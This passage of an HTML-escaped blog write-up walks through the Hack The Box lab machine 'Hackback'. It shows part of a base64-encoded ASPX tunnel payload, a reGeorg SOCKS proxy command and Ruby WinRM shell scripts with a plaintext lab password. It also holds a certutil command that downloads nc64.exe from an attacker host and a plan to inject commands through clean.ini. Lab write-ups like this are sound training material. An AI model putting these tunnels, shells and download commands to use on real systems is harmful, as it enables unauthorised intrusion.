CJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK&quot;)); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-checked-the-tunnel-&quot;&gt;Then I checked the tunnel :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;great-&quot;&gt;Great !&lt;/h4&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;running-the-proxy-server-shell-as-simple&quot;&gt;Running the Proxy Server, Shell as simple&lt;/h3&gt;
+&lt;h4 id=&quot;first-thing-to-do-is-to-configure-proxychains-to-use-whatever-port-we-like-i-used-8888-&quot;&gt;First thing to do is to configure &lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to use whatever port we like, I used 8888 :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/hackback/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-used-regeorgsocksproxypy-and-gave-it-the-port-and-the-path-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;reGeorgSocksProxy.py&lt;/code&gt; and gave it the port and the path :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python reGeorgSocksProxy.py -p 8888 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx &lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/hackback/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-we-can-connect-as-simple-i-used-alamots-winrm-ruby-shell-&quot;&gt;Now we can connect as &lt;code class=&quot;highlighter-rouge&quot;&gt;simple&lt;/code&gt;. I used Alamot’s winrm ruby shell :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm'&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
+  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.10.128:5985/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;transport: :ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;user: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'simple'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;password: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ZonoProprioZomaro:-('&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gets&lt;/span&gt;        
+        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
+            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
+    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and--no-flag-&quot;&gt;And …. no flag !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;cleanini--shell-as-hacker&quot;&gt;clean.ini , Shell as hacker&lt;/h3&gt;
+&lt;h4 id=&quot;i-checked-c-and-found-a-strange-directory-called-util-&quot;&gt;I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\&lt;/code&gt; and found a strange directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;util&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;cutil&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;c:\util&lt;/code&gt;:&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK C:\&amp;gt; cd util                              
+PS hackback\simple@HACKBACK util&amp;gt; ls
+
+Directory: C:\util
+    
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       12/14/2018   3:30 PM                PingCastle
+
+-a----         3/8/2007  12:12 AM         139264 Fping.exe
+
+-a----        3/29/2017   7:46 AM         312832 kirbikator.exe
+
+-a----       12/14/2018   3:42 PM           1404 ms.hta
+
+-a----        2/29/2016  12:04 PM         359336 PSCP.EXE
+
+-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE
+
+-a----         5/4/2018  12:21 PM          23552 RawCap.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;however-there-was-a-hidden-directory-if-we-do-dir--force-&quot;&gt;However there was a hidden directory, if we do &lt;code class=&quot;highlighter-rouge&quot;&gt;dir -force&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK util&amp;gt; dir -force
+
+Directory: C:\util
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----                                     
+d-----       12/14/2018   3:30 PM                PingCastle
+
+d--h--       12/21/2018   6:21 AM                scripts
+
+-a----         3/8/2007  12:12 AM         139264 Fping.exe
+
+-a----        3/29/2017   7:46 AM         312832 kirbikator.exe
+
+-a----       12/14/2018   3:42 PM           1404 ms.hta
+
+-a----        2/29/2016  12:04 PM         359336 PSCP.EXE
+
+-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE
+
+-a----         5/4/2018  12:21 PM          23552 RawCap.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;a-new-directory-appeared--scripts-looking-in-that-directory-&quot;&gt;A new directory appeared : &lt;code class=&quot;highlighter-rouge&quot;&gt;scripts&lt;/code&gt;. looking in that directory :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK util&amp;gt; cd scripts
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Could not find item C:\util\scripts.
+At line:1 char:56
++ ... join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name), ...
++                                                           ~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\util\scripts:String) [Get-Item], IOException
+    + FullyQualifiedErrorId : ItemNotFound,Microsoft.PowerShell.Commands.GetItemCommand
+PS hackback\simple@HACKBACK &amp;gt; ls
+
+    Directory: C:\util\scripts
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       12/13/2018   2:54 PM            spool
+-a----       12/21/2018   5:44 AM         84 backup.bat
+-a----         7/5/2019   5:34 PM         39 batch.log
+-a----         7/5/2019   6:07 PM        135 clean.ini
+-a----        12/8/2018   9:17 AM       1232 dellog.ps1
+-a----         7/5/2019   5:34 PM         36 log.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;without-talking-too-much-about-the-rabbit-holes-and-the-failed-attempts-if-we-check-cleanini-&quot;&gt;Without talking too much about the rabbit holes and the failed attempts. If we check &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.ini&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK &amp;gt; type clean.ini
+[Main]
+LifeTime=100
+LogFile=c:\util\scripts\log.txt
+Directory=c:\inetpub\logs\logfiles
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;obviously-it-gets-executed-from-time-to-time-and-its-the-only-writable-thing-by-simple-in-that-directory-we-can-inject-commands-in-logfile-which-means-that-we-can-make-another-user-execute-our-commands-i-tried-to-upload-ncexe-but-&quot;&gt;Obviously it gets executed from time to time, and it’s the only writable thing by &lt;code class=&quot;highlighter-rouge&quot;&gt;simple&lt;/code&gt; in that directory. We can inject commands in &lt;code class=&quot;highlighter-rouge&quot;&gt;LogFile&lt;/code&gt; which means that we can make another user execute our commands. I tried to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; but :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS hackback\simple@HACKBACK &amp;gt; certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\system32\spool\drivers\color\nc.exe
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+At line:1 char:1
++ certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\s ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;expected-i-terminated-that-winrm-session-and-used-alamots-other-winrm-shell-that-had-upload-and-download-capabilities-&quot;&gt;Expected. I terminated that &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; session and used Alamot’s other &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; shell that had upload and download capabilities :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm-fs'&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# To upload a file type: UPLOAD local_path remote_path&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# e.g.: PS&amp;gt; UPLOAD myfile.txt C:\temp\myfile.txt&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
+  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.10.128:5985/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;user: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'simple'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;password: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ZonoProprioZomaro:-('&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FileManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+      &lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/\s(?=(?:[^'&quot;]|'[^']*'|&quot;[^&quot;]*&quot;)*$)/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;
+      &lt;span class=&quot;nf&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;empty?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}.&lt;/span&gt;
+      &lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/(^ +)|( +$)|(^[&quot;']+)|([&quot;']+$)/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:powershell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&amp;gt; ')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gets&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start_with?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'UPLOAD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
+            &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Uploading &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; to &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes of &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes copied&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
